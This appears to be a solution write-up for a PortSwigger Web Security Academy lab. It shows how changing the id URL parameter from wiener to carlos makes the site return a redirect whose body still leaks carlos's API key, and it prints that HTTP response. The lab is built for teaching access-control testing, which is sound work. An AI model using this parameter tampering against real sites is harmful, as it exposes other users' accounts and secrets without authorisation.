# [Lab: User ID controlled by request parameter with data leakage in redirect](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)

This lab contains an  [access control](https://portswigger.net/web-security/access-control)  vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user  `carlos`  and submit it as the solution.

You can log in to your own account using the following credentials:  `wiener:peter`

## Analysis

login to `wiener` account:

```url
https://id.web-security-academy.net/my-account?id=wiener
```

change value of `id` parameter to `carlos`:

```url
https://id.web-security-academy.net/my-account?id=carlos
```

=> redirected to login page

## Solutions

check the http response in burpsuite, even though it's a 3xx http response, the body still contains the content:

```http
HTTP/1.1 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Connection: close
Content-Length: 3395

        <div id=account-content>

        <div>Your API Key is: sMctlBUitcILqisWH7l38Ami24XjlesY</div>    
```

submit carlos api key => solved.
